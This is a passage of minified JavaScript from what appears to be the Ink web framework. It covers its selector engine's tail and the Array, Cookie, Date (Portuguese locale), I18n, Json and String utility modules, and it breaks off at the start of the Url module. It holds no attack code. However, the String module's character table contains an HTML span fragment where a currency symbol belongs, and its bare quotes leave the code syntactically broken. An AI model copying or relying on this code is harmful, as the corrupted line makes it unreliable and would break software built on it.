t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeName>"@"||3===e.nodeType||4===e.nodeType)return!1;return!0},parent:function(e){return!w.pseudos.empty(e)},header:function(e){return me.test(e.nodeName)},input:function(e){return fe.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||t.toLowerCase()===e.type)},first:l((function(){return[0]})),last:l((function(e,t){return[t-1]})),eq:l((function(e,t,n){return[n<0?n+t:n]})),even:l((function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e})),odd:l((function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e})),lt:l((function(e,t,n){for(var i=n<0?n+t:n;--i>=0;)e.push(i);return e})),gt:l((function(e,t,n){for(var i=n<0?n+t:n;++i<t;)e.push(i);return e}))}},{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})w.pseudos[_]=a(_);for(_ in{submit:!0,reset:!0})w.pseudos[_]=s(_);return C=o.compile=function(e,t){var n,i=[],o=[],r=W[e+" "];if(!r){for(t||(t=c(e)),n=t.length;n--;)(r=m(t[n]))[U]?i.push(r):o.push(r);r=W(e,g(o,i))}return r},w.pseudos.nth=w.pseudos.eq,y.prototype=w.filters=w.pseudos,w.setFilters=new y,F.sortStable=U.split("").sort(q).join("")===U,T(),[0,0].sort(q),F.detectDuplicates=V,{select:o,matches:o.matches,matchesSelector:o.matchesSelector}})),Ink.createModule("Ink.Util.Array","1",[],(function(){"use strict";var e=Array.prototype,t={isArray:Array.isArray||function(e){return"[object Array]"==={}.toString.call(e)},groupBy:function(e,n){function i(e){return"function"==typeof n.key?n.key(e):"string"==typeof n.key?e[n.key]:e}function o(e){var t=n.pairs?[e,[]]:[];return s.push(t),a.push(e),t}n=n||{};for(var r,a=[],s=[],l=0,c=e.length;l<c;l++){var u;r=i(e[l]),u=n.adjacentGroups?a[a.length-1]===r?s[s.length-1]:o(r):s[t.keyValue(r,a,!0)]||o(r),n.pairs?u[1].push(e[l]):u.push(e[l])}return s},reduce:function(t,n,i){if(e.reduce)return e.reduce.apply(t,e.slice.call(arguments,1));var o,r=Object(t),a=r.length>>>0,s=0;if(arguments.length>=3)o=i;else{for(;s<a&&!(s in r);)s++;if(s>=a)throw new TypeError("Reduce of empty array with no initial value");o=r[s++]}for(;s<a;s++)s in r&&(o=n(o,r[s],s,r));return o},inArray:function(e,t){if("object"==typeof t)for(var n=0,i=t.length;n<i;++n)if(t[n]===e)return!0;return!1},sortMulti:function(e,t){if(void 0===e||e.constructor!==Array)return!1;if("string"!=typeof t)return e.sort();if(e.length>0){if(void 0===e[0][t])return!1;e.sort((function(e,n){var i=e[t],o=n[t];return i<o?-1:i>o?1:0}))}return e},keyValue:function(e,t,n){if(void 0!==e&&"object"==typeof t&&this.inArray(e,t)){for(var i=[],o=0,r=t.length;o<r;++o)if(t[o]===e){if(void 0!==n&&!0===n)return o;i.push(o)}return i}return!1},shuffle:function(e){if(void 0!==e&&e.constructor!==Array)return!1;for(var t=e.length,n=!1,i=!1;t--;)i=Math.floor(Math.random()*(t+1)),n=e[t],e[t]=e[i],e[i]=n;return e},forEach:function(t,n,i){if(e.forEach)return e.forEach.call(t,n,i);for(var o=0,r=t.length>>>0;o<r;o++)n.call(i,t[o],o,t)},forEachObj:function(e,n,i){t.forEach(t.keys(e),(function(t){n.call(i||null,e[t],t,e)}))},each:function(){t.forEach.apply(t,e.slice.call(arguments))},map:function(t,n,i){if(e.map)return e.map.call(t,n,i);for(var o=new Array(a),r=0,a=t.length>>>0;r<a;r++)o[r]=n.call(i,t[r],r,t);return o},filter:function(t,n,i){if(e.filter)return e.filter.call(t,n,i);for(var o=[],r=null,a=0,s=t.length;a<s;a++)r=t[a],n.call(i,r,a,t)&&o.push(r);return o},some:function(e,t,n){if(null===e)throw new TypeError("First argument is invalid.");var i=Object(e),o=i.length>>>0;if("function"!=typeof t)throw new TypeError("Second argument must be a function.");for(var r=0;r<o;r++)if(r in i&&t.call(n,i[r],r,i))return!0;return!1},intersect:function(e,t){if(!e||!t||e instanceof Array==0||t instanceof Array==0)return[];for(var n=[],i=0,o=e.length;i<o;++i)for(var r=0,a=t.length;r<a;++r)e[i]===t[r]&&n.push(e[i]);return n},convert:function(t){return e.slice.call(t||[],0)},unique:function(e){if(!Array.prototype.lastIndexOf){var n=[];return t.forEach(t.convert(e),(function(e){t.inArray(e,n)||n.push(e)})),n}return t.filter(t.convert(e),(function(e,t,n){return n.lastIndexOf(e)===t}))},range:function(e,t,n){1===arguments.length&&(t=e,e=0),n||(n=1);var i,o=[];if(n>0)for(i=e;i<t;i+=n)o.push(i);else for(i=e;i>t;i+=n)o.push(i);return o},insert:function(e,t,n){e.splice(t,0,n)},keys:function(e){if(Object.keys)return Object.keys(e);var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(n);return t},remove:function(e,t,n){for(var i=[],o=0,r=e.length;o<r;o++)o>=t&&o<t+n||i.push(e[o]);return i}};return t})),Ink.createModule("Ink.Util.Cookie","1",[],(function(){"use strict";return{get:function(e){var t=document.cookie||!1,n={};if(t){var i=(t=t.replace(new RegExp("; ","g"),";")).split(";"),o=[];if(i.length>0)for(var r=0;r<i.length;r++)2===(o=i[r].split("=")).length&&(n[o[0]]=decodeURIComponent(o[1]));if(e)return void 0!==n[e]?n[e]:null}return n},set:function(e,t,n,i,o,r){var a;if(!e||!1===t||void 0===e||void 0===t)return!1;a=e+"="+encodeURIComponent(t);var s,l,c=!1,u=!1;if(n&&void 0!==n&&!isNaN(n)){var d=new Date,h=parseInt(Number(d.valueOf()),10)+1e3*Number(parseInt(n,10)),p=new Date(h).toGMTString(),f=new RegExp("([^\\s]+)(\\s\\d\\d)\\s(\\w\\w\\w)\\s(.*)");c="expires="+(p=p.replace(f,"$1$2-$3-$4"))}else c=void 0===n||isNaN(n)||0!==Number(parseInt(n,10))?"expires=Thu, 01-Jan-2037 00:00:01 GMT":"";s=i&&void 0!==i?"path="+i:"path=/",o?u="domain="+o:/\./.test(window.location.hostname)&&(u="domain="+window.location.hostname),l=!(!r||void 0===r)&&r,document.cookie=a+"; "+c+"; "+s+(u?"; "+u:"")+"; "+l},remove:function(e,t,n){this.set(e,"deleted",-1,t,n)}}})),Ink.createModule("Ink.Util.Date","1",[],(function(){"use strict";return{_months:function(e){return["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"][e]},_iMonth:function(e){return Number(e)?+e-1:{janeiro:0,jan:0,fevereiro:1,fev:1,"março":2,mar:2,abril:3,abr:3,maio:4,mai:4,junho:5,jun:5,julho:6,jul:6,agosto:7,ago:7,setembro:8,set:8,outubro:9,out:9,novembro:10,nov:10,dezembro:11,dez:11}[e.toLowerCase()]},_wDays:function(e){return["Domingo","Segunda","Terça","Quarta","Quinta","Sexta","Sábado"][e]},_iWeek:function(e){return Number(e)?+e||7:{segunda:1,seg:1,"terça":2,ter:2,quarta:3,qua:3,quinta:4,qui:4,sexta:5,sex:5,"sábado":6,"sáb":6,domingo:7,dom:7}[e.toLowerCase()]},_daysInMonth:function(e,t){return 1===e||3===e||5===e||7===e||8===e||10===e||12===e?31:4===e||6===e||9===e||11===e?30:t%400==0||t%4==0&&t%100!=0?29:28},get:function(e,t){void 0!==e&&""!==e||(e="Y-m-d");var n,i=e.split(""),o=new Array(i.length);n=void 0===t?new Date:"number"==typeof t?new Date(1e3*t):new Date(t);for(var r,a,s,l=0;l<i.length;l++)switch(i[l]){case"\\":o[l]=i[l+1],l++;break;case"d":var c=n.getDate();o[l]=String(c).length>1?c:"0"+c;break;case"D":o[l]=this._wDays(n.getDay()).substring(0,3);break;case"j":o[l]=n.getDate();break;case"l":o[l]=this._wDays(n.getDay());break;case"N":o[l]=n.getDay()||7;break;case"S":var u=n.getDate(),d="";o[l]=u>=11&&u<=13?"th":(d=["st","nd","rd"][String(u).substr(-1)-1])?d:"th";break;case"w":o[l]=n.getDay();break;case"z":r=Date.UTC(n.getFullYear(),0,0),a=Date.UTC(n.getFullYear(),n.getMonth(),n.getDate()),o[l]=Math.floor((a-r)/864e5);break;case"W":var h=new Date(n.getFullYear(),0,1);r=h.getDay()||7;var p=Math.floor((n-h)/864e5+1);o[l]=Math.ceil((p-(8-r))/7)+1;break;case"F":o[l]=this._months(n.getMonth());break;case"m":var f=String(n.getMonth()+1);o[l]=f.length>1?f:"0"+f;break;case"M":o[l]=this._months(n.getMonth()).substring(0,3);break;case"n":o[l]=n.getMonth()+1;break;case"t":o[l]=this._daysInMonth(n.getMonth()+1,n.getYear());break;case"L":var m=n.getFullYear();o[l]=!(m%4||!(m%100)&&m%400);break;case"o":throw'"o" not implemented!';case"Y":o[l]=n.getFullYear();break;case"y":o[l]=String(n.getFullYear()).substring(2);break;case"a":o[l]=n.getHours()<12?"am":"pm";break;case"A":o[l]=n.getHours<12?"AM":"PM";break;case"B":throw'"B" not implemented!';case"g":s=n.getHours(),o[l]=s<=12?s:s-12;break;case"G":o[l]=String(n.getHours());break;case"h":s=(s=String(n.getHours()))<=12?s:s-12,o[l]=s.length>1?s:"0"+s;break;case"H":s=String(n.getHours()),o[l]=s.length>1?s:"0"+s;break;case"i":var g=String(n.getMinutes());o[l]=g.length>1?g:"0"+g;break;case"s":var v=String(n.getSeconds());o[l]=v.length>1?v:"0"+v;break;case"u":throw'"u" not implemented!';case"e":throw'"e" not implemented!';case"I":r=new Date(n.getFullYear(),0,1),o[l]=n.getTimezoneOffset()!==r.getTimezoneOffset()?1:0;break;case"O":var y=n.getTimezoneOffset(),_=y%60;"-"!==(s=String((y-_)/60*-1)).charAt(0)&&(s="+"+s),s=3===s.length?s:s.replace(/([+\-])(\d)/,"$10$2"),o[l]=s+_+"0";break;case"P":throw'"P" not implemented!';case"T":throw'"T" not implemented!';case"Z":o[l]=60*n.getTimezoneOffset();break;case"c":throw'"c" not implemented!';case"r":var b=this._wDays(n.getDay()).substr(0,3),w=this._months(n.getMonth()).substr(0,3);o[l]=b+", "+n.getDate()+" "+w+this.get(" Y H:i:s O",n);break;case"U":o[l]=Math.floor(n.getTime()/1e3);break;default:o[l]=i[l]}return o.join("")},set:function(e,t){if(void 0!==t){void 0!==e&&""!==e||(e="Y-m-d");for(var n,i=e.split(""),o=new Array(i.length),r={year:void 0,month:void 0,day:void 0,dayY:void 0,dayW:void 0,week:void 0,hour:void 0,hourD:void 0,min:void 0,sec:void 0,msec:void 0,ampm:void 0,diffM:void 0,diffH:void 0,date:void 0},a=0,s=0;s<i.length;s++)switch(i[s]){case"\\":o[s]=i[s+1],s++;break;case"d":o[s]="(\\d{2})",r.day={original:s,match:a++};break;case"j":o[s]="(\\d{1,2})",r.day={original:s,match:a++};break;case"D":o[s]="([\\wá]{3})",r.dayW={original:s,match:a++};break;case"l":o[s]="([\\wá]{5,7})",r.dayW={original:s,match:a++};break;case"N":case"w":o[s]="(\\d)",r.dayW={original:s,match:a++};break;case"S":o[s]="\\w{2}";break;case"z":o[s]="(\\d{1,3})",r.dayY={original:s,match:a++};break;case"W":o[s]="(\\d{1,2})",r.week={original:s,match:a++};break;case"F":o[s]="([\\wç]{4,9})",r.month={original:s,match:a++};break;case"M":o[s]="(\\w{3})",r.month={original:s,match:a++};break;case"m":o[s]="(\\d{2})",r.month={original:s,match:a++};break;case"n":o[s]="(\\d{1,2})",r.month={original:s,match:a++};break;case"t":o[s]="\\d{2}";break;case"L":o[s]="\\w{4,5}";break;case"o":throw'"o" not implemented!';case"Y":o[s]="(\\d{4})",r.year={original:s,match:a++};break;case"y":o[s]="(\\d{2})",void 0!==r.year&&"Y"===i[r.year.original]||(r.year={original:s,match:a++});break;case"a":o[s]="(am|pm)",r.ampm={original:s,match:a++};break;case"A":o[s]="(AM|PM)",r.ampm={original:s,match:a++};break;case"B":throw'"B" not implemented!';case"g":o[s]="(\\d{1,2})",r.hourD={original:s,match:a++};break;case"G":o[s]="(\\d{1,2})",r.hour={original:s,match:a++};break;case"h":o[s]="(\\d{2})",r.hourD={original:s,match:a++};break;case"H":o[s]="(\\d{2})",r.hour={original:s,match:a++};break;case"i":o[s]="(\\d{2})",r.min={original:s,match:a++};break;case"s":o[s]="(\\d{2})",r.sec={original:s,match:a++};break;case"u":throw'"u" not implemented!';case"e":throw'"e" not implemented!';case"I":o[s]="\\d";break;case"O":o[s]="([-+]\\d{4})",r.diffH={original:s,match:a++};break;case"P":throw'"P" not implemented!';case"T":throw'"T" not implemented!';case"Z":o[s]="(\\-?\\d{1,5})",r.diffM={original:s,match:a++};break;case"c":throw'"c" not implemented!';case"r":o[s]="([\\wá]{3}, \\d{1,2} \\w{3} \\d{4} \\d{2}:\\d{2}:\\d{2} [+\\-]\\d{4})",r.date={original:s,match:a++};break;case"U":o[s]="(\\d{1,13})",r.date={original:s,match:a++};break;default:o[s]=i[s]}var l=new RegExp(o.join(""));try{if(!(n=t.match(l)))return}catch(e){return}var c,u,d=void 0!==r.date,h=void 0!==r.year,p=void 0!==r.dayY,f=void 0!==r.day,m=void 0!==r.month,g=m&&f,v=!m&&f,y=void 0!==r.dayW,_=void 0!==r.week,b=p||g||!h&&v||_&&y||!h&&(!_&&y),w=!(h||p||f||m||y||_),k=void 0!==r.hourD&&void 0!==r.ampm,I=void 0!==r.hour,C=k||I,x=void 0!==r.min,S=void 0!==r.sec,E=void 0!==r.msec,T=!w||C,A=T||x,O=void 0!==r.diffM,D=void 0!==r.diffH;if(d){if("U"===i[r.date.original])return new Date(1e3*+n[r.date.match+1]);var P=n[r.date.match+1].match(/\w{3}, (\d{1,2}) (\w{3}) (\d{4}) (\d{2}):(\d{2}):(\d{2}) ([+\-]\d{4})/);return c=+P[4]+ +P[7].slice(0,3),u=+P[5]+(P[7].slice(0,1)+P[7].slice(3))/100*60,new Date(P[3],this._iMonth(P[2]),P[1],c,u,P[6])}var N,M,L,U,R=new Date;if(b||w){if(b){if(h){var F=R.getFullYear()-50+"";N=n[r.year.match+1],"y"===i[r.year.original]&&(N=+F.slice(0,2)+(N>=F.slice(2)?0:1)+N)}else N=R.getFullYear();if(p)M=0,L=n[r.dayY.match+1];else if(f)M=m?this._iMonth(n[r.month.match+1]):R.getMonth(),L=n[r.day.match+1];else{M=0,L=7*((_?n[r.week.match+1]:this.get("W",R))-2)+(8-(new Date(N,0,1).getDay()||7))+this._iWeek(n[r.week.match+1])}if(0===M&&L>31){var j=new Date(N,M,L);M=j.getMonth(),L=j.getDate()}}else N=R.getFullYear(),M=R.getMonth(),L=R.getDate();return c=k?+n[r.hourD.match+1]+("pm"===n[r.ampm.match+1]?12:0):I?n[r.hour.match+1]:w?R.getHours():"00",u=x?n[r.min.match+1]:T?"00":R.getMinutes(),U=S?n[r.sec.match+1]:A?"00":R.getSeconds(),E?n[r.msec.match+1]:"000",D?n[r.diffH.match+1]:O?String(-1*n[r.diffM.match+1]/60*100).replace(/^(\d)/,"+$1").replace(/(^[\-+])(\d{3}$)/,"$10$2"):"+0000",new Date(N,M,L,c,u,U)}}}}})),Ink.createModule("Ink.Util.I18n","1",[],(function(){"use strict";var e=/\{(?:(\{.*?})|(?:%s:)?(\d+)|(?:%s)?|([\w-]+))}/g,t=function(e,t){return"function"==typeof e?e.apply(this,t):void 0!==e?e:""},n=function(e,t,i){return this instanceof n?void this.reset().lang(t).testMode(i).append(e||{},t):new n(e,t,i)};return n.prototype={reset:function(){return this._dicts=[],this._dict={},this._testMode=!1,this._lang=this._gLang,this},clone:function(){for(var e=new n,t=0,i=this._dicts.length;t<i;t++)e.append(this._dicts[t]);return e.testMode(this.testMode()),e.lang(this.lang()),e},append:function(e){return this._dicts.push(e),this._dict=Ink.extendObj(this._dict,e[this._lang]),this},lang:function(e){if(!arguments.length)return this._lang;if(e&&this._lang!==e){this._lang=e,this._dict={};for(var t=0,n=this._dicts.length;t<n;t++)this._dict=Ink.extendObj(this._dict,this._dicts[t][e]||{})}return this},testMode:function(e){return arguments.length?(void 0!==e&&(this._testMode=!!e),this):!!this._testMode},getKey:function(e){var t,i=this._gLang,o=this._lang;return e in this._dict?t=this._dict[e]:(n.langGlobal(o),t=this._gDict[e],n.langGlobal(i)),t},text:function(n){if("string"==typeof n){var i=Array.prototype.slice.call(arguments,1),o=0,r="object"==typeof i[0],a=this.getKey(n);return void 0===a&&(a=this._testMode?"["+n+"]":n),"number"==typeof a&&(a+=""),"string"==typeof a?a=a.replace(e,(function(e,n,a,s){var l=n||(a?i[a-(r?0:1)]:s&&i[0]?i[0][s]||"":i[o+++(r?1:0)]);return t(l,[o].concat(i))})):"function"==typeof a?a.apply(this,i):a instanceof Array||"object"==typeof a?t(a[i[0]],i):""}},ntext:function(e,t,n){var i,o=Array.prototype.slice.apply(arguments);if(2===o.length&&"number"==typeof t){if(!((i=this.getKey(e))instanceof Array))return"";o.splice(0,1),i=i[1===t?0:1]}else o.splice(0,2),i=1===n?e:t;return this.text.apply(this,[i].concat(o))},ordinal:function(e){if(void 0===e)return"";var n,i=+e.toString().slice(-1),o=this.getKey("_ordinals");return void 0===o?"":"string"==typeof o?o:"function"==typeof o&&"string"==typeof(n=o(e,i))||"exceptions"in o&&"string"==typeof(n="function"==typeof o.exceptions?o.exceptions(e,i):e in o.exceptions?t(o.exceptions[e],[e,i]):void 0)||"byLastDigit"in o&&"string"==typeof(n="function"==typeof o.byLastDigit?o.byLastDigit(i,e):i in o.byLastDigit?t(o.byLastDigit[i],[i,e]):void 0)||"default"in o&&"string"==typeof(n=t(o.default,[e,i]))?n:""},alias:function(){var e=Ink.bind(n.prototype.text,this);return e.ntext=Ink.bind(n.prototype.ntext,this),e.append=Ink.bind(n.prototype.append,this),e.ordinal=Ink.bind(n.prototype.ordinal,this),e.testMode=Ink.bind(n.prototype.testMode,this),e}},n.reset=function(){n.prototype._gDicts=[],n.prototype._gDict={},n.prototype._gLang="pt_PT"},n.reset(),n.appendGlobal=function(e,t){if(t){if(!(t in e)){var i={};i[t]=e,e=i}t!==n.prototype._gLang&&n.langGlobal(t)}n.prototype._gDicts.push(e),Ink.extendObj(n.prototype._gDict,e[n.prototype._gLang])},n.langGlobal=function(e){if(!arguments.length)return n.prototype._gLang;if(e&&n.prototype._gLang!==e){n.prototype._gLang=e,n.prototype._gDict={};for(var t=0,i=n.prototype._gDicts.length;t<i;t++)Ink.extendObj(n.prototype._gDict,n.prototype._gDicts[t][e]||{})}},n})),Ink.createModule("Ink.Util.Json","1",[],(function(){"use strict";function twoDigits(e){var t=""+e;return 1===t.length?"0"+t:t}var function_call=Function.prototype.call,cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,dateToISOString=Date.prototype.toISOString?Ink.bind(function_call,Date.prototype.toISOString):function(e){return e.getUTCFullYear()+"-"+twoDigits(e.getUTCMonth()+1)+"-"+twoDigits(e.getUTCDate())+"T"+twoDigits(e.getUTCHours())+":"+twoDigits(e.getUTCMinutes())+":"+twoDigits(e.getUTCSeconds())+"."+String((e.getUTCMilliseconds()/1e3).toFixed(3)).slice(2,5)+"Z"},InkJson={_nativeJSON:window.JSON||null,_convertToUnicode:!1,_escape:function(e){var t={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};return/["\\\x00-\x1f]/.test(e)&&(e=e.replace(/([\x00-\x1f\\"])/g,(function(e,n){var i=t[n];return i||(i=n.charCodeAt(),"\\u00"+Math.floor(i/16).toString(16)+(i%16).toString(16))}))),e},_toUnicode:function(e){if(this._convertToUnicode){for(var t="",n=!1,i=!1,o=0,r=e.length;o<r;){if((n=e.charCodeAt(o))>=32&&n<=126||8===n||9===n||10===n||12===n||13===n||32===n||34===n||47===n||58===n||92===n)i=34===n||92===n||47===n?"\\"+e.charAt(o):8===n?"\\b":9===n?"\\t":10===n?"\\n":12===n?"\\f":13===n?"\\r":e.charAt(o);else if(this._convertToUnicode){for(i=e.charCodeAt(o).toString(16)+"".toUpperCase();i.length<4;)i="0"+i;i="\\u"+i}else i=e.charAt(o);t+=i,o++}return t}return this._escape(e)},_stringifyValue:function(e){if("string"==typeof e)return'"'+this._toUnicode(e)+'"';if("number"!=typeof e||!isNaN(e)&&isFinite(e)){if(null==e)return"null";if("function"==typeof e.toJSON){var t=e.toJSON();return"string"==typeof t?'"'+this._escape(t)+'"':this._escape(t.toString())}if("number"==typeof e||"boolean"==typeof e)return""+e;if("function"==typeof e)return"null";if(e.constructor===Date)return'"'+this._escape(dateToISOString(e))+'"';if(e.constructor===Array){for(var n="",i=0,o=e.length;i<o;i++)i>0&&(n+=","),n+=this._stringifyValue(e[i]);return"["+n+"]"}var r="";for(var a in e)({}).hasOwnProperty.call(e,a)&&(""!==r&&(r+=","),r+='"'+this._escape(a)+'": '+this._stringifyValue(e[a]));return"{"+r+"}"}return"null"},stringify:function(e,t){return this._convertToUnicode=!!t,!this._convertToUnicode&&this._nativeJSON?this._nativeJSON.stringify(e):this._stringifyValue(e)},parse:function(text,reviver){function walk(e,t){var n,i,o=e[t];if(o&&"object"==typeof o)for(n in o)Object.prototype.hasOwnProperty.call(o,n)&&(void 0!==(i=walk(o,n))?o[n]=i:delete o[n]);return reviver.call(e,t,o)}var j;if(text=String(text),cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,(function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}))),/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")}};return InkJson})),Ink.createModule("Ink.Util.String","1",[],(function(){"use strict";var InkUtilString={_chars:["&","à","á","â","ã","ä","å","æ","ç","è","é","ê","ë","ì","í","î","ï","ð","ñ","ò","ó","ô","õ","ö","ø","ù","ú","û","ü","ý","þ","ÿ","À","Á","Â","Ã","Ä","Å","Æ","Ç","È","É","Ê","Ë","Ì","Í","Î","Ï","Ð","Ñ","Ò","Ó","Ô","Õ","Ö","Ø","Ù","Ú","Û","Ü","Ý","Þ","<span class="currencyMain"></span>",'"',"ß","<",">","¢","£","¤","¥","¦","§","¨","©","ª","«","¬","­","®","¯","°","±","²","³","´","µ","¶","·","¸","¹","º","»","¼","½","¾"],_entities:["amp","agrave","aacute","acirc","atilde","auml","aring","aelig","ccedil","egrave","eacute","ecirc","euml","igrave","iacute","icirc","iuml","eth","ntilde","ograve","oacute","ocirc","otilde","ouml","oslash","ugrave","uacute","ucirc","uuml","yacute","thorn","yuml","Agrave","Aacute","Acirc","Atilde","Auml","Aring","AElig","Ccedil","Egrave","Eacute","Ecirc","Euml","Igrave","Iacute","Icirc","Iuml","ETH","Ntilde","Ograve","Oacute","Ocirc","Otilde","Ouml","Oslash","Ugrave","Uacute","Ucirc","Uuml","Yacute","THORN","euro","quot","szlig","lt","gt","cent","pound","curren","yen","brvbar","sect","uml","copy","ordf","laquo","not","shy","reg","macr","deg","plusmn","sup2","sup3","acute","micro","para","middot","cedil","sup1","ordm","raquo","frac14","frac12","frac34"],_accentedChars:["à","á","â","ã","ä","å","è","é","ê","ë","ì","í","î","ï","ò","ó","ô","õ","ö","ù","ú","û","ü","ç","ñ","À","Á","Â","Ã","Ä","Å","È","É","Ê","Ë","Ì","Í","Î","Ï","Ò","Ó","Ô","Õ","Ö","Ù","Ú","Û","Ü","Ç","Ñ"],_accentedRemovedChars:["a","a","a","a","a","a","e","e","e","e","i","i","i","i","o","o","o","o","o","u","u","u","u","c","n","A","A","A","A","A","A","E","E","E","E","I","I","I","I","O","O","O","O","O","U","U","U","U","C","N"],_htmlUnsafeChars:{"<":"&lt;",">":"&gt;","&":"&amp;",'"':"&quot;","'":"&apos;"},ucFirst:function(e,t){var n=t?/(^|\s)(\w)(\S{2,})/:/(^|\s)(\w)(\S{2,})/g;return e?String(e).replace(n,(function(e,t,n,i){return t+n.toUpperCase()+i.toLowerCase()})):e},trim:function(e){return"string"==typeof e?e.replace(/^\s+|\s+$|\n+$/g,""):e},stripTags:function(e,t){if(t&&"string"==typeof t){for(var n=InkUtilString.trim(t).split(","),i=[],o=!1,r=0;r<n.length;r++)""!==InkUtilString.trim(n[r])&&(o=InkUtilString.trim(n[r].replace(/(<|\>)/g,"").replace(/\s/,"")),i.push("(<"+o+"\\s[^>]+>|<(\\s|\\/)?(\\s|\\/)?"+o+">)"));for(var a=i.join("|"),s=new RegExp(a,"i"),l=e.match(new RegExp("<[^>]*>","g")),c=0;c<l.length;c++)l[c].match(s)||(e=e.replace(new RegExp(l[c],"gm"),""));return e}return e.replace(/<[^\>]+\>/g,"")},htmlEntitiesEncode:function(e){if(e&&e.replace)for(var t=!1,n=0;n<InkUtilString._chars.length;n++)t=new RegExp(InkUtilString._chars[n],"gm"),e=e.replace(t,"&"+InkUtilString._entities[n]+";");return e},htmlEntitiesDecode:function(e){if(e&&e.replace){for(var t=!1,n=0;n<InkUtilString._entities.length;n++)t=new RegExp("&"+InkUtilString._entities[n]+";","gm"),e=e.replace(t,InkUtilString._chars[n]);e=e.replace(/&#[^;]+;?/g,(function(e){return"x"===e.charAt(2)?String.fromCharCode(parseInt(e.substring(3),16)):String.fromCharCode(parseInt(e.substring(2),10))}))}return e},utf8Encode:function(e){e=e.replace(/\r\n/g,"\n");for(var t="",n=0;n<e.length;n++){var i=e.charCodeAt(n);i<128?t+=String.fromCharCode(i):i>127&&i<2048?(t+=String.fromCharCode(i>>6|192),t+=String.fromCharCode(63&i|128)):(t+=String.fromCharCode(i>>12|224),t+=String.fromCharCode(i>>6&63|128),t+=String.fromCharCode(63&i|128))}return t},shortString:function(e,t){for(var n=e.split(" "),i="",o=0;o<n.length;o++){if((i+n[o]+" ").length>=t){i+="&hellip;";break}i+=n[o]+" "}return i},truncateString:function(e,t){return e.length-1>t?e.substr(0,t-1)+"…":e},utf8Decode:function(e){for(var t="",n=0,i=0,o=0,r=0;n<e.length;)(i=e.charCodeAt(n))<128?(t+=String.fromCharCode(i),n++):i>191&&i<224?(o=e.charCodeAt(n+1),t+=String.fromCharCode((31&i)<<6|63&o),n+=2):(o=e.charCodeAt(n+1),r=e.charCodeAt(n+2),t+=String.fromCharCode((15&i)<<12|(63&o)<<6|63&r),n+=3);return t},removeAccentedChars:function(e){for(var t=e,n=!1,i=0;i<InkUtilString._accentedChars.length;i++)n=new RegExp(InkUtilString._accentedChars[i],"gm"),t=t.replace(n,""+InkUtilString._accentedRemovedChars[i]);return t},substrCount:function(e,t){return e?e.split(t).length-1:0},evalJSON:function(strJSON,sanitize){if(null==sanitize||InkUtilString.isJSON(strJSON))try{return"undefined"!=typeof JSON&&void 0!==JSON.parse?JSON.parse(strJSON):eval("("+strJSON+")")}catch(e){throw new Error("ERROR: Bad JSON string...")}},isJSON:function(e){return e=e.replace(/\\./g,"@").replace(/"[^"\\\n\r]*"/g,""),/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/.test(e)},htmlEscapeUnsafe:function(e){var t=InkUtilString._htmlUnsafeChars;return null!==e?String(e).replace(/[<>&'"]/g,(function(e){return t[e]})):e},normalizeWhitespace:function(e){return null!==e?InkUtilString.trim(String(e).replace(/\s+/g," ")):e},toUnicode:function(e){if("string"==typeof e){for(var t="",n=!1,i=!1,o=e.length,r=0;r<o;){if((n=e.charCodeAt(r))>=32&&n<=126||8===n||9===n||10===n||12===n||13===n||32===n||34===n||47===n||58===n||92===n)i=8===n?"\\b":9===n?"\\t":10===n?"\\n":12===n?"\\f":13===n?"\\r":e.charAt(r);else{for(i=e.charCodeAt(r).toString(16)+"".toUpperCase();i.length<4;)i="0"+i;i="\\u"+i}t+=i,r++}return t}},escape:function(e){var t=e.charCodeAt(0).toString(16).split("");if(t.length<3){for(;t.length<2;)t.unshift("0");t.unshift("x")}else{for(;t.length<4;)t.unshift("0");t.unshift("u")}return t.unshift("\\"),t.join("")},unescape:function(e){var t=e.lastIndexOf("0");t=-1===t?2:Math.min(t,2);var n=e.substring(t),i=parseInt(n,16);return String.fromCharCode(i)},escapeText:function(e,t){void 0===t&&(t=["[","]","'",","]);for(var n,i,o=[],r=0,a=e.length;r<a;++r)((i=(n=e[r]).charCodeAt(0))<32||i>126&&-1===t.indexOf(n))&&(n=InkUtilString.escape(n)),o.push(n);return o.join("")},escapedCharRegex:/(\\x[0-9a-fA-F]{2})|(\\u[0-9a-fA-F]{4})/g,unescapeText:function(e){for(var t;t=InkUtilString.escapedCharRegex.exec(e);)t=t[0],e=e.replace(t,InkUtilString.unescape(t)),InkUtilString.escapedCharRegex.lastIndex=0;return e},strcmp:function(e,t){return e===t?0:e>t?1:-1},packetize:function(e,t){for(var n,i=e.length,o=new Array(Math.ceil(i/t)),r=e.split(""),a=0;i;)n=Math.min(t,i),o[a++]=r.splice(0,n).join(""),i-=n;return o}};return InkUtilString})),Ink.createModule("Ink.Util.Url","1",[],(function(){"use strict";return{_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",getUrl:function(){return window.location.href},genQueryString:function(e,t){var n,i,o,r=-1!==e.indexOf("?"),a=[e];for(i in 